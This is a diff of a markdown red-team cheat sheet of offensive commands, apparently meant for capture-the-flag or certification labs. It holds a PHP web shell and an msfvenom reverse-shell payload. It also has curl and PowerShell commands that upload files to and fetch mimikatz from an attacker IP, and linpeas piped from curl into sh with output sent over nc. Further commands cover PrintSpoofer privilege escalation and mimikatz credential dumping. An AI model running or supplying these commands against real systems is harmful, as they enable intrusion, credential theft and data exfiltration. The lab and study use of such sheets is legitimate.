@@ -1,36 +1,6 @@
 # Red Team Cheat Sheet
-Useful Quick Commands - Linux
-
-```bash
-# Find folders where the user has write permission
-find /home -type d -writable -user $(whoami)
-# Find flags
-find / -name "flag.txt" -print -quit 2>/dev/null
-find / -type f \( -name "local.txt" -o -name "proof.txt" -o -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) -print -quit 2>/dev/null
-# Linux - Find files containing keyword
-find '/var/www' -type f -exec grep -l 'password' {} + 2>/dev/null
-grep -rnw '/home/svc' -e 'password' 2>/dev/null
-```
-
-Useful Quick Commands - Windows
-
-```bash
-# Windows runas command
-runas /user:backupadmin cmd
-```
-
-Stabilize reverse shell
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-stty raw -echo; fg
-export TERM=xterm
-```
 
 # Web
-
-## Directory Traversal
 
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
 
@@ -53,30 +23,38 @@ https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-mediu
 https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
 ```
 
-## HTTP Server for Upload and Download
+HTTP Server for Upload and Download
 
-```
+```bash
 # Download
 https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py
 
 # Start Server
 python3 httpserver.py (default port 80)
 python3 httpserver.py -p 8000
+```
 
+Upload and Download with Curl
+
+```bash
 # Upload file with curl
-curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.45.145/
+curl -F 'file=@/home/ubuntu/Desktop/linpeas.out' http://192.168.45.145/
 
 # Download file with curl
 curl -O http://192.168.45.145/linpeas.sh
-
-# Upload with PowerShell
-Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $fs = [System.IO.File]::OpenRead("C:\Users\Public\test.out"); $content = New-Object System.Net.Http.MultipartFormDataContent; $fileContent = New-Object System.Net.Http.StreamContent($fs); $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data"); $fileContent.Headers.ContentDisposition.Name = '"file"'; $fileContent.Headers.ContentDisposition.FileName = '"test.out"'; $content.Add($fileContent); $client.PostAsync("http://192.168.45.199/", $content).Wait(); $client.Dispose()
-
-# Download with PowerShell
-iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
 ```
 
-# Shell
+Upload and Download with PowerShell
+
+```powershell
+# Upload with PowerShell
+Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $fs = [System.IO.File]::OpenRead("C:\Users\Public\winpeas.out"); $content = New-Object System.Net.Http.MultipartFormDataContent; $fileContent = New-Object System.Net.Http.StreamContent($fs); $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data"); $fileContent.Headers.ContentDisposition.Name = '"file"'; $fileContent.Headers.ContentDisposition.FileName = '"test.out"'; $content.Add($fileContent); $client.PostAsync("http://192.168.45.145/", $content).Wait(); $client.Dispose()
+
+# Download with PowerShell
+iwr -uri "http://192.168.45.145/mimikatz.exe" -outfile "C:\Users\Public\mimikatz.exe"
+```
+
+# Reverse Shell
 
 Reverse Shell Generator https://www.revshells.com/
 
@@ -85,7 +63,21 @@ Reverse Shell Generator https://www.revshells.com/
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
+```powershell
+# Windows Stageless
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.199 LPORT=9002 -f exe -o reverse.exe
+```
+
 # Windows
+
+Quick Commands
+
+```powershell
+# Run as another user (Launch new window)
+runas /user:backupadmin cmd
+# Search for Flag
+Get-ChildItem -Path C:\Users -Include local.txt,proof.txt,user.txt,root.txt,flag.txt -File -Recurse -ErrorAction SilentlyContinue
+```
 
 PrintSpoofer (Abusing `SeImpersonatePrivilege`)
 
@@ -124,9 +116,21 @@ sekurlsa::logonpasswords full
 
 # Linux
 
+Linpeas
+
 ```powershell
 https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 # Excute from memory and send output back to the host
 nc -lvnp 9002 | tee linpeas.out # attacker
 curl http://192.168.45.145/linpeas.sh | sh | nc 192.168.45.145 9002 # victim
+```
+
+# Services
+
+FTP
+
+```bash
+# Download all the files
+ftp 192.168.119.2
+mget *
 ```
